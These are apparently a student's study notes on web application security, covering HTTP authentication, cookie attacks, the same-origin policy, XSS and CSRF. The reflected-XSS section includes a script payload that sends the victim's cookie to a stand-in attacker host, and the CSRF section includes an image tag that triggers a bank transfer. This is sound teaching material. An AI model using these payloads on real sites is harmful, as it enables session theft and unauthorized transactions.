---
related to:
created: 2025-11-30, 21:05
updated: 2025-12-08T16:44
completed: false
---
## basic information
>[!info] URL structure
![[Pasted image 20251130210909.png]]
there are *non-allowed* characters: `:/?#[]@!$&'()*+,;=`, as in ASCII they are encoded with a `%` followed by two hexadecimal digits, and URLs nee

basics of [[04 - livello applicazione; HTTP#HTTP|HTTP protocol]]

>[!info] dynamic contents to HTTP requests
servers and clients use scripting languages to create dynamic content for web users. this can happen *client side* or *server side*:
>- *client side scripting*: downloaded from the server and executed on the client’s computer, it is completely visible and readable to the user. it can access the resources the browser is given permission to see (like cookies or local storage)
>	- javascript, VBscript, ActiveX, Ajax
>- *server side scripting*: it is executed entirely on the web server, before the final result is sent back to the client’s browser 
>	- PHP, ASP.NET, Java, Perl, Ruby, Go, Python, server-side javascript like node.js

## HTTP authentication
an authentication rarely used nowadays (with reason, who in our lords year 2025 (or ever) would authenticate through HTTP)
1. the browser starts a request without sending any client-side credentials
2. the server replies with a status message: *”401 Unauthorized”*, with a specific `WWW-Authenticate` header, which contains information on the authentication method. the browser then prompts the user for credentials.
3. the browser gets the client’s credentials and includes them in the `Authorization` header and sent back to the server (either base64-encoded (however this has to be done through HTTPS to encrypt the entire communication) or hashed with the username, password, (other things), and a *nonce* (random, one-time value))
>[!info] burp suite
*burp* (*bollettino ufficiale regione puglia*) is an integrated platform for performing security testing of web applications.
from the initial mapping and analysis of an application’s attack surface, through to finding and exploiting security vulnerabilities, burp allows to combine advanced manual techniques with parts of automation
some of burp’s tools are:
>- intruder tool
>- repeater tool
>- sequencer tool

### cookie security
the security of [[04 - livello applicazione; HTTP#cookie|cookies]] is critical, as they are used for authentication of a session
>[!info] cookie attacks
>- *session hijacking*
![[Pasted image 20251130222732.png]]
> - *session prediction*: early PHP implementations of session were susceptible to this attack, as cookie ids could be a total of 1 million (which is not that much)
>- *session fixation*
![[Pasted image 20251130222753.png]]
>- *insecure direct object reference*
session cookies can be used in *IDOR* attacks, that happen when an application provides *direct access* to objects based on user-supplied input, without proper identification
this way, the user can directly access to information not intended to be accessible, bypassing the authorization check that would be needed
## same origin policy
most of the browser’s security mechanisms rely on the possibility of isolating documents *depending on the resource’s origin*. generally, the pages from different sources should not be allowed to interfere with each other.
- this means that a malicious website cannot run scripts that access data and functionalities of other websites visited by the user (impeding *cross-site scripting* (*XSS*))
this mechanism is part of the *same origin policy* (*SOP*), the single most important security concept in web browsers, that is designed to isolate docments from different websites to provent unauthorized data access.
- it was introduced by netscape in 1995

the browser defines an *origin* based on the combination of three parts of the URL: *protocol*, *domain name* and *port*

SOP’s simplicity is also its limit, as:
- we cannot isolate homepages of different users hosted on the same origin
- different domains cannot easily interact among each others if legitimately needed
	- solution: `document.domain` can be used to relax the SOP by reducing domain definitions to its parent domains, thereby matching other sibling subdomains that do the same
	- betersolution: `postMessage()` allows scripts to send messages between windows located on completely different origins in a controlled and safe manner (it allows both the sender and the receiver to agree on the communication boundaries)
## client-side attacks
client-side attacks *exploit the trust of the browser* (as opposite to exploiting the trust of servers). 
in particular, they exploit the trust:
- a user towards a website (*XSS*)
- of a website towards a user (*CSRF*)
by injecting HTML or 
some of the goals can be:
- stealing a cookie associated to the vulnerable domain
- login from manipulations
- execution of additional GET/POST requests
- anything doable with HTML + js
### XSS
*cross-site scripting* aims to access unauthorized information stored on the client’s browser, or to perform unauthorized actions, by 
1. injecting HTML/js code in a web page, exploiting a *lack of input sanitization* to make it run
2. client’s brower executes any code and renders any HTML present on the vulnerable page
the goals of XSS can be:
- capturing infomation of the victim (their session)
- display additional/misleading information
- inejct additional form fields
- make victim do something instead of the attacker (like an SQLi)
- many more
#### types of XSS
- *reflected XSS*: the injection happens in a parameter used by the page to dinamically display infomation to the user
>[!example] example of reflected xss
![[Pasted image 20251208160948.png]]
the vulnerability is that the website has a response script that directly echoes the user’s `keyword` parameter into the HTML response, without any sanitization or encoding
>- the attacker crafts a malicious link (to the vulnerable site) containing the XSS payload, that is designed to read the cookie and make a request to the attacker’s server. in this case, the payload is:
>```html
><script>window.location='http://attacker/cookie' + document.cookie</script>
>```
>- the attacker sends the URL to the victim, that executes it sending a GET request to the vulnerable site with the malicious payload
>- the vulnerable site executes its vulnerable response script, concatenating the raw, uninvalidated payload into the HTML response
>	- while it can make sense to echo the search result for client-side logging/tracking, but it should be escaped (escaping characters like `<>"'^&`)
>- when the victim’s browser receives the response, it starts rendering the page. when it gets to the `<script>` tag, it executes the code immediately, sending a GET request to the attacker’s server with its cookie as a parameter

- *stored XSS*: the injection is stored in a page of the web application, and then displayed to users accessing such a page
>[!example] example of stored XSS
![[Pasted image 20251208162836.png]]
pretty self explanatory

- *DOM-based XSS*: the injection happens in a parameter used by a script running within the page itself
## request forgery
request forgery, also known as *one-click attack*, session riding or hostile linking, is aimed at having a victim executed a number of actions by using the victim’s credentials (e.g. session cookie)
- however, this has to be done without direct access to the cookies (as we can’t access cookies of another domain because of SOP), thus no stealing of data happens
it can be *cross site* (*CSRF*) or *on site* (*OSRF*, like [[https://sa.my/myspace/tech.html|samy worm]]), and it can be both reflexted and stored

forgery requests exploit the fact that brower requests automatically include any credential associated with the site (session cookie, IP address, credentials …).
the attacker makes an authenticated user submit a malicious, unintentional request
>[!example] CSRF example
![[Pasted image 20251208164021.png]]
the victim, after authenticating on the bank’s website, could visiti a malicious website, that contains something like

```html
<img src="http://www.bank/transfer.php?to=1337&amount=10000"
```
that makes the browser execute a GET request with to the URL above
because the request contains the right cookie (as the request is made by the vict), the bank will satisfy the request